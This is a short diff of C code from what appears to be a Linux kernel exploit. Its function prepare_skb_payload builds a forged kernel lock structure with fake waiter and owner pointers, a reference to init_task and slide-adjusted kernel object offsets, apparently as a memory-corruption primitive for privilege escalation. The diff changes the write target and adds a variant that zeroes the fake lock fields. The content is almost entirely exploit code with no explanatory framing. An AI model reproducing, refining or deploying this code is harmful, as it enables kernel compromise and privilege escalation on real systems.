@@ -1001,7 +1001,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   uint64_t pi_top_task = text_addr(INIT_TASK);
   uint32_t waiter_prio = FAKE_WAITER_PRIO;
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    write_pc = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset;
+    write_pc = SLIDE_LOGGERS_0_1 + slide_p0_offset;
     write_right = 0;
     write_left = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
 #if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
@@ -1022,9 +1022,15 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 
     put32(p, LOCK_OFF + 0x00, 0);
     if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+#if defined(SLIDE_UPSTREAM_EMPTY_LOCK) && SLIDE_UPSTREAM_EMPTY_LOCK
+      put64(p, LOCK_OFF + FAKE_LOCK_WAITERS_ROOT_OFF, 0);
+      put64(p, LOCK_OFF + FAKE_LOCK_WAITERS_LEFTMOST_OFF, 0);
+      put64(p, LOCK_OFF + FAKE_LOCK_OWNER_OFF, 0);
+#else
       put64(p, LOCK_OFF + FAKE_LOCK_WAITERS_ROOT_OFF, fake_w0);
       put64(p, LOCK_OFF + FAKE_LOCK_WAITERS_LEFTMOST_OFF, fake_w0);
       put64(p, LOCK_OFF + FAKE_LOCK_OWNER_OFF, SLIDE_LOCK_OWNER_VALUE);
+#endif
     } else {
       put64(p, LOCK_OFF + FAKE_LOCK_WAITERS_ROOT_OFF, fake_w0);
       put64(p, LOCK_OFF + FAKE_LOCK_WAITERS_LEFTMOST_OFF, fake_w0);
